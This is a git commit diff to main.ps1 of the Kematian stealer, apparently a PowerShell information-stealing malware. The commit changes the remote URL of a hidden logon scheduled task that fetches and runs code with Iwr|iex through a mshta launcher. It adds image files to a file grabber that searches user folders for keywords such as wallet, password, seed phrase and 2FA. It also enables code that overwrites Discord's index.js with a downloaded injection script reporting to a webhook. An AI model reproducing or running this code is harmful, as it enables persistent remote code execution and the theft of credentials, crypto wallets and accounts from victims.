55402cfbf936cc61ccccfd2e164682782daeb19d
Agony <batman56654@inbox.lv>
2024-07-14 22:23:27 +0300

    Update main.ps1

--- main.ps1
+++ main.ps1
@@ -83,10 +83,10 @@ function Invoke-TASKS {
         $KDOT_DIR.Attributes = "Hidden", "System"
         $task_name = "Kematian"
         $task_action = if ($debug) {
-            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/Agonyxxx/Injection/main/main.ps1'|iex`""
+            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/main.ps1'|iex`""
         }
         else {
-            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/Agonyxxx/Injection/main/main.ps1'|iex`",0)(window.close)"
+            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/main.ps1'|iex`",0)(window.close)"
         }
         $task_trigger = New-ScheduledTaskTrigger -AtLogOn
         $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
@@ -955,10 +955,11 @@ function Backup-Data {
 	
     Write-Host "[!] Session Grabbing Ended" -ForegroundColor Green
 
-  
+
+    
 
     function FilesGrabber {
-        $allowedExtensions = @("*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log", "*.pem", "*.ppk", "*.key", "*.pfx")
+        $allowedExtensions = @("*.jpg", "*.png", "*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log", "*.pem", "*.ppk", "*.key", "*.pfx")
         $keywords = @("2fa", "account", "auth", "backup", "bank", "binance", "bitcoin", "bitwarden", "btc", "casino", "code", "coinbase ", "crypto", "dashlane", "discord", "eth", "exodus", "facebook", "funds", "info", "keepass", "keys", "kraken", "kucoin", "lastpass", "ledger", "login", "mail", "memo", "metamask", "mnemonic", "nordpass", "note", "pass", "passphrase", "paypal", "pgp", "private", "pw", "recovery", "remote", "roboform", "secret", "seedphrase", "server", "skrill", "smtp", "solana", "syncthing", "tether", "token", "trading", "trezor", "venmo", "vault", "wallet")
         $paths = @("$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop")
         foreach ($path in $paths) {
@@ -1003,30 +1004,31 @@ function Backup-Data {
     }
 
 
-    #$locAppData = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
-    #$discPaths = @("Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment")
+    $locAppData = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
+    $discPaths = @("Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment")
 
-    #foreach ($path in $discPaths) {
-    #    $skibidipath = Join-Path $locAppData $path
-    #    if (-not (Test-Path $skibidipath)) {
-    #        continue
-    #    }
-    #    Get-ChildItem $skibidipath -Recurse | ForEach-Object {
-    #        if ($_ -is [System.IO.DirectoryInfo] -and ($_.FullName -match "discord_desktop_core")) {
-    #            $files = Get-ChildItem $_.FullName
-    #            foreach ($file in $files) {
-    #                if ($file.Name -eq "index.js") {
-    #                    $webClient = New-Object System.Net.WebClient
-    #                    $content = $webClient.DownloadString("https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/injection.js")
-    #                    if ($content -ne "") {
-    #                        $replacedContent = $content -replace "%WEBHOOK%", $webhook
-    #                        $replacedContent | Set-Content -Path $file.FullName -Force
-    #                    }
-    #                }
-    #            }
-    #        }
-    #    }
-    #}
+    foreach ($path in $discPaths) {
+        $skibidipath = Join-Path $locAppData $path
+        if (-not (Test-Path $skibidipath)) {
+            continue
+        }
+        Get-ChildItem $skibidipath -Recurse | ForEach-Object {
+            if ($_ -is [System.IO.DirectoryInfo] -and ($_.FullName -match "discord_desktop_core")) {
+                $files = Get-ChildItem $_.FullName
+                foreach ($file in $files) {
+                    if ($file.Name -eq "index.js") {
+                        $webClient = New-Object System.Net.WebClient
+                        $content = $webClient.DownloadString("https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/injection.js")
+                        if ($content -ne "") {
+                            $data_webhook = $webhook -replace "/data", "/injection"
+                            $replacedContent = $content -replace "%WEBHOOK%", $webhook
+                            $replacedContent | Set-Content -Path $file.FullName -Force
+                        }
+                    }
+                }
+            }
+        }
+    }
     
     #Shellcode loader, Thanks to https://github.com/TheWover for making this possible !
     
